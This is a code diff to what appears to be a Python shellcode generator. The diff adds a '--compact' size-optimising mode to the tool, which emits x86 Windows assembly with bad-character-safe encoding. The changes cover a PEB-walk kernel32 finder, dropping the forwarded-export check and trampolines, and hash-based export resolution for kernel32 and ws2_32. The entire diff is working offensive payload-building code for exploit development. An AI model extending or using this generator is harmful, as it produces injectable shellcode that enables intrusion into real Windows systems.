@@ -52,10 +52,12 @@ from .structure_emitter import emit_all_structures
 # large framework stubs produced by aggressive badchar encoding.
 # ---------------------------------------------------------------------------
 
-def _emit_framework_stubs_part1a(badchars: set[int]) -> str:
+def _emit_framework_stubs_part1a(badchars: set[int], compact: bool = False) -> str:
     """Generate Part 1a stubs (PEB walk + kernel32 find) with badchar-safe encoding.
 
     Part 1a of the framework stubs (PEB walk, kernel32 find).
+    In compact mode, uses the third InInitializationOrderModuleList entry
+    instead of comparing unicode characters.
     """
     from .encode import (
         _disp_has_badchar,
@@ -64,6 +66,32 @@ def _emit_framework_stubs_part1a(badchars: set[int]) -> str:
         safe_sub_imm,
     )
     lines: list[str] = []
+
+    if compact:
+        # Compact kernel32 finder: PEB -> Ldr -> InInitOrder, third entry.
+        # The third module in InInitializationOrderModuleList is kernel32 on
+        # Windows XP through Windows 11.
+        lines.append("find_module:")
+        lines.append("    xor ecx, ecx")
+        if not _disp_has_badchar(0x30, badchars):
+            lines.append("    mov eax, fs:[ecx + 0x30]")
+        else:
+            from .encode import encode_dword
+            lines.extend(encode_dword(0x30, badchars, "edx"))
+            lines.append("    add edx, ecx")
+            lines.append("    mov eax, fs:[edx]")
+        lines.extend(safe_mem_load("eax", "eax", 0x0c, badchars, tmp="edx"))
+        lines.extend(safe_mem_load("eax", "eax", 0x1c, badchars, tmp="edx"))
+        # First entry: ntdll.dll, follow Flink
+        lines.append("    mov  eax, [eax]")
+        # Second entry: kernelbase.dll, follow Flink
+        lines.append("    mov  eax, [eax]")
+        # Third entry: kernel32.dll, extract base address
+        lines.extend(safe_mem_load("ebx", "eax", 0x08, badchars, tmp="edx"))
+        lines.append("    ret")
+        return "\n".join(lines)
+
+    # -- Normal mode: full PEB walk with unicode char comparisons --
 
     # get_first_ldr_entry: PEB -> Ldr -> InInitializationOrderModuleList
     lines.append("get_first_ldr_entry:")
@@ -103,19 +131,21 @@ def _emit_framework_stubs_part1a(badchars: set[int]) -> str:
     return "\n".join(lines)
 
 
-def _emit_framework_stubs_part1b(badchars: set[int]) -> str:
+def _emit_framework_stubs_part1b(badchars: set[int], compact: bool = False) -> str:
     """Generate Part 1b stubs (export directory/tables + save context).
 
     Placed after the first trampoline. find_module calls back into Part 1a.
+    In compact mode, find_module is already defined in part1a so we skip it here.
     """
     from .encode import safe_mem_load, safe_mem_store
     lines: list[str] = []
 
-    # find_module: entry point
-    lines.append("find_module:")
-    lines.append("    call get_first_ldr_entry")
-    lines.append("    jmp find_kernel32_entry")
-    lines.append("")
+    if not compact:
+        # find_module: entry point (normal mode only)
+        lines.append("find_module:")
+        lines.append("    call get_first_ldr_entry")
+        lines.append("    jmp find_kernel32_entry")
+        lines.append("")
 
     # get_export_directory: PE header -> export directory RVA
     lines.append("get_export_directory:")
@@ -150,7 +180,7 @@ def _emit_framework_stubs_part1b(badchars: set[int]) -> str:
     return "\n".join(lines)
 
 
-def _emit_framework_stubs_part2(badchars: set[int]) -> str:
+def _emit_framework_stubs_part2(badchars: set[int], compact: bool = False) -> str:
     """Generate Part 2 stubs (hash computation + export resolution) with badchar-safe encoding."""
     from .encode import safe_mem_load, safe_mem_store, safe_ror_imm
     lines: list[str] = []
@@ -175,54 +205,60 @@ def _emit_framework_stubs_part2(badchars: set[int]) -> str:
     lines.append("")
 
     # resolve_matched_export: ordinal -> function address
-    # Forwarded exports: if the function RVA falls inside the export directory
-    # (RVA >= export_dir_rva && RVA < export_dir_rva + export_dir_size), the
-    # entry is an ASCII forwarder string, not code.  Detect and trap.
     lines.append("resolve_matched_export:")
     lines.extend(safe_mem_load("edx", "ebp", -0x0c, badchars, tmp="eax"))
     lines.append("    movzx eax, word ptr [edx + ecx*2]")
     lines.extend(safe_mem_load("esi", "ebp", -0x10, badchars, tmp="edx"))
     lines.append("    mov eax, [esi + eax*4]")
-    lines.append("")
-    # --- forwarded export check ---
-    # EAX = function RVA.  Re-derive export dir bounds from PE header.
-    # [ebp-0x04] = module_base.  PE+0x78 = export dir RVA, PE+0x7C = size.
-    # Register plan: push func_rva to free EAX, then ECX = module_base,
-    # EDX = PE header VA, ESI/EDI/EAX = scratch for safe_mem_load.
-    lines.append("    push eax")
-    lines.extend(safe_mem_load("ecx", "ebp", -0x04, badchars, tmp="edx"))
-    lines.extend(safe_mem_load("edx", "ecx", 0x3c, badchars, tmp="esi"))
-    lines.append("    add edx, ecx")
-    # ESI = export_dir_rva
-    lines.extend(safe_mem_load("esi", "edx", 0x78, badchars, tmp="eax"))
-    # EDI = export_dir_size
-    lines.extend(safe_mem_load("edi", "edx", 0x7c, badchars, tmp="eax"))
-    lines.append("    add edi, esi")
-    lines.append("    pop eax")
-    # Lower bound: func_rva < export_dir_rva -> not forwarded
-    if 0x3b in badchars:
-        lines.append("    push eax")
-        lines.append("    sub eax, esi")
-        lines.append("    pop eax")
+
+    if compact:
+        # Compact: skip forwarded-export detection (kernel32/ws2_32 never
+        # forward the APIs we resolve). Just add module_base and return.
+        lines.extend(safe_mem_load("ecx", "ebp", -0x04, badchars, tmp="edx"))
+        lines.append("    add eax, ecx")
+        lines.append("    ret")
+        lines.append("")
     else:
-        lines.append("    cmp eax, esi")
-    lines.append("    jb not_forwarded")
-    # Upper bound: func_rva < export_dir_end -> forwarded
-    if 0x3b in badchars:
+        lines.append("")
+        # --- forwarded export check ---
+        # EAX = function RVA.  Re-derive export dir bounds from PE header.
+        # [ebp-0x04] = module_base.  PE+0x78 = export dir RVA, PE+0x7C = size.
+        # Register plan: push func_rva to free EAX, then ECX = module_base,
+        # EDX = PE header VA, ESI/EDI/EAX = scratch for safe_mem_load.
         lines.append("    push eax")
-        lines.append("    sub eax, edi")
+        lines.extend(safe_mem_load("ecx", "ebp", -0x04, badchars, tmp="edx"))
+        lines.extend(safe_mem_load("edx", "ecx", 0x3c, badchars, tmp="esi"))
+        lines.append("    add edx, ecx")
+        # ESI = export_dir_rva
+        lines.extend(safe_mem_load("esi", "edx", 0x78, badchars, tmp="eax"))
+        # EDI = export_dir_size
+        lines.extend(safe_mem_load("edi", "edx", 0x7c, badchars, tmp="eax"))
+        lines.append("    add edi, esi")
         lines.append("    pop eax")
-    else:
-        lines.append("    cmp eax, edi")
-    lines.append("    jb forwarded_export")
-    lines.append("")
-    lines.append("not_forwarded:")
-    lines.append("    add eax, ecx")
-    lines.append("    ret")
-    lines.append("")
-    lines.append("forwarded_export:")
-    lines.append("    int3")
-    lines.append("")
+        # Lower bound: func_rva < export_dir_rva -> not forwarded
+        if 0x3b in badchars:
+            lines.append("    push eax")
+            lines.append("    sub eax, esi")
+            lines.append("    pop eax")
+        else:
+            lines.append("    cmp eax, esi")
+        lines.append("    jb not_forwarded")
+        # Upper bound: func_rva < export_dir_end -> forwarded
+        if 0x3b in badchars:
+            lines.append("    push eax")
+            lines.append("    sub eax, edi")
+            lines.append("    pop eax")
+        else:
+            lines.append("    cmp eax, edi")
+        lines.append("    jb forwarded_export")
+        lines.append("")
+        lines.append("not_forwarded:")
+        lines.append("    add eax, ecx")
+        lines.append("    ret")
+        lines.append("")
+        lines.append("forwarded_export:")
+        lines.append("    int3")
+        lines.append("")
 
     # resolve_export_by_hash: loop through exports comparing hashes
     lines.append("resolve_export_by_hash:")
@@ -677,31 +713,56 @@ def compose_asm(
         e.label for e in manifest.strings if e.value in dll_names
     }
 
+    compact = config.compact
+
     parts: list[str] = [
         "; AUTO-GENERATED by emitter-v1",
         f"; Manifest: {manifest_path}",
         f"; Template: {template_name}",
         f"; Generated: {_build_timestamp()}",
         "",
-        "    _start:",
-        "        jmp _stub_trampoline1",
-        "",
-        "; -- Framework Stubs --",
-        "",
-        _emit_framework_stubs_part1a(config.badchars),
-        "_stub_trampoline1:",
-        "    jmp _stub_trampoline2",
-        "",
-        _emit_framework_stubs_part1b(config.badchars),
-        "_stub_trampoline2:",
-        "    jmp main",
-        "",
-        _emit_framework_stubs_part2(config.badchars),
-        "; -- Main --",
-        "",
-        "; __ALIGNMENT_NOPS__",
-        "",
-        "main:",
+    ]
+
+    if compact:
+        parts += [
+            "    _start:",
+            "        jmp main",
+            "",
+            "; -- Framework Stubs (compact) --",
+            "",
+            _emit_framework_stubs_part1a(config.badchars, compact=True),
+            "",
+            _emit_framework_stubs_part1b(config.badchars, compact=True),
+            "",
+            _emit_framework_stubs_part2(config.badchars, compact=True),
+            "; -- Main --",
+            "",
+            "main:",
+        ]
+    else:
+        parts += [
+            "    _start:",
+            "        jmp _stub_trampoline1",
+            "",
+            "; -- Framework Stubs --",
+            "",
+            _emit_framework_stubs_part1a(config.badchars),
+            "_stub_trampoline1:",
+            "    jmp _stub_trampoline2",
+            "",
+            _emit_framework_stubs_part1b(config.badchars),
+            "_stub_trampoline2:",
+            "    jmp main",
+            "",
+            _emit_framework_stubs_part2(config.badchars),
+            "; -- Main --",
+            "",
+            "; __ALIGNMENT_NOPS__",
+            "",
+            "main:",
+        ]
+
+    parts += [
         "    mov  ebp, esp",
         "    xor  ecx, ecx",
         *_emit_stack_reserve(layout.frame_size, config.badchars),
@@ -773,11 +834,12 @@ def compose_asm(
             "",
         ]
 
-    parts += [
-        "hang:",
-        "    jmp hang",
-        "",
-    ]
+    if not compact:
+        parts += [
+            "hang:",
+            "    jmp hang",
+            "",
+        ]
 
     return "\n".join(parts)
 
@@ -954,6 +1016,12 @@ def main() -> None:
              "(e.g. 00,0a,0d,20,25)",
     )
     parser.add_argument(
+        "--compact", action="store_true",
+        help="Optimize for size: drop forwarded-export check, remove "
+             "trampolines, use rep stosd for struct zeroing, skip error "
+             "branches in workflows, simplify kernel32 detection.",
+    )
+    parser.add_argument(
         "--exit-strategy",
         choices=["exit_process", "terminate_process", "thread_only"],
         default="exit_process",
@@ -1009,6 +1077,7 @@ def main() -> None:
         process_name=args.process_name,
         service_name=args.service_name,
         exit_strategy=args.exit_strategy,
+        compact=args.compact,
     )
 
     extra_badchars: set[int] | None = None
